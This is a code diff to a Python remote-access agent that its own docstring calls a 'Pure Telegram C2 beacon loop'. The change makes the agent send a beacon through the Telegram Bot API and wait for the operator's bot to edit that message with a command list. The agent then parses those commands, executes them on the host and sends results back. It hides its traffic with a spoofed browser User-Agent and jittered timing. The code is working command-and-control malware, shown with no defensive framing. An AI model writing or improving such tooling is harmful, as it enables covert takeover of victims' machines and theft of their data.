@@ -174,20 +174,18 @@ def telegram_send(message: str, reply_to: int = None) -> dict:
             return {"ok": False, "error": "rate_limit", "retry_after": 30}
         return {"ok": False, "error": str(e)}
 
-def telegram_get_commands_via_topic(agent_id: str) -> list:
-    """Get commands from Telegram using forum topic or direct messages.
+def telegram_get_commands_via_edit(agent_id: str, beacon_msg_id: int) -> list:
+    """Get commands from edited beacon message.
     
-    Uses a simple approach: read recent messages and find commands.
-    Stores offset to avoid re-reading old messages.
+    Bot edits our beacon message to add commands.
+    We read the edit via getUpdates with edited_message filter.
     """
     global _command_chat_offset
     commands = []
     
     try:
-        # Use getUpdates with allowed_updates to minimize conflict
-        # This reads ALL updates, we filter for commands
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-        params = f"?offset={_command_chat_offset + 1}&limit=5&timeout=0&allowed_updates=[\"message\",\"edited_message\"]"
+        params = f"?offset={_command_chat_offset + 1}&limit=10&timeout=0&allowed_updates=[\"edited_message\",\"message\"]"
         
         req = Request(url + params, headers={"User-Agent": "Mozilla/5.0"})
         resp = urlopen(req, timeout=5)
@@ -197,32 +195,30 @@ def telegram_get_commands_via_topic(agent_id: str) -> list:
             for update in result.get("result", []):
                 _command_chat_offset = update.get("update_id", _command_chat_offset)
                 
-                # Check for new or edited message
-                msg = update.get("message") or update.get("edited_message")
+                # Check for edited message
+                msg = update.get("edited_message") or update.get("message")
                 if not msg:
                     continue
                 
                 text = msg.get("text", "")
-                chat_id = msg["chat"]["id"]
+                msg_id = msg.get("message_id", 0)
                 
-                # Look for command format: /cmd AGENT_ID COMMAND
-                # or Task format from bot
-                if "📋" in text or "Task #" in text:
-                    # Parse task
-                    task_match = re.search(r'Task #(\d+)', text)
-                    type_match = re.search(r'Type:\s*(\w+)', text)
-                    cmd_match = re.search(r'Command:\s*(.+)', text, re.MULTILINE)
-                    
-                    if task_match and cmd_match:
-                        commands.append({
-                            "id": task_match.group(1),
-                            "type": type_match.group(1) if type_match else "exec",
-                            "command": cmd_match.group(1).strip()
-                        })
-                        log(f"Got command: Task #{task_match.group(1)}", "TASK")
+                # Check if this is our beacon edited
+                if msg_id == beacon_msg_id and "📋 Commands:" in text:
+                    # Parse commands
+                    cmd_section = text.split("📋 Commands:")[-1]
+                    for line in cmd_section.strip().split("\n"):
+                        # Format: #123 [exec] command
+                        match = re.match(r'#(\d+)\s*\[(\w+)\]\s*(.+)', line.strip())
+                        if match:
+                            commands.append({
+                                "id": match.group(1),
+                                "type": match.group(2),
+                                "command": match.group(3)
+                            })
+                            log(f"Got command: #{match.group(1)} {match.group(3)[:30]}", "TASK")
                         
     except Exception as e:
-        # Ignore 409 conflict - bot is polling
         if "409" not in str(e):
             log(f"Get commands error: {e}", "DEBUG")
     
@@ -288,11 +284,10 @@ def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
     """Pure Telegram C2 beacon loop - no HTTP required.
     
     Architecture:
-    1. Agent sends beacon via Telegram sendMessage
-    2. Agent immediately reads updates (may conflict with bot - handled)
-    3. Bot sees beacon, replies with commands
-    4. Agent parses replies and executes
-    5. Agent sends result via Telegram
+    1. Agent sends beacon via Telegram sendMessage -> gets message_id
+    2. Bot sees beacon, edits it to add commands (editMessageText)
+    3. Agent polls for edited_message with same message_id
+    4. Agent parses commands, executes, sends result
     
     Uses only Telegram API - no HTTP server needed.
     """
@@ -300,7 +295,7 @@ def telegram_beacon_loop(agent_id: str, sleep: int = 3, jitter: int = 5):
     
     _total_beacons = 0
     _total_tasks = 0
-    _consecutive_409 = 0
+    _last_beacon_msg_id = 0
     
     log(f"Pure Telegram bridge started (agent={agent_id[:8]})", "START")
     
@@ -321,8 +316,8 @@ Time: {time.strftime('%H:%M:%S')}"""
             result = telegram_send(beacon_msg)
             
             if result.get("ok"):
-                log(f"Beacon #{_total_beacons} sent", "CONN")
-                _consecutive_409 = 0
+                _last_beacon_msg_id = result.get("message_id", 0)
+                log(f"Beacon #{_total_beacons} sent (msg_id={_last_beacon_msg_id})", "CONN")
             elif result.get("error") == "rate_limit":
                 wait = result.get("retry_after", 30)
                 log(f"Rate limited, waiting {wait}s", "WARN")
@@ -331,14 +326,11 @@ Time: {time.strftime('%H:%M:%S')}"""
             else:
                 log(f"Beacon failed: {result.get('error')}", "ERROR")
             
-            # Try to get commands (may fail with 409)
-            commands = telegram_get_commands_via_topic(agent_id)
+            # Wait a bit for bot to process and edit
+            time.sleep(2)
             
-            # If 409 conflicts, just skip - bot will reply next time
-            if not commands:
-                _consecutive_409 += 1
-                if _consecutive_409 > 5:
-                    log("Multiple 409 conflicts - bot may be using long polling", "WARN")
+            # Check for edited beacon (commands from bot)
+            commands = telegram_get_commands_via_edit(agent_id, _last_beacon_msg_id)
             
             # Process commands
             for cmd in commands:
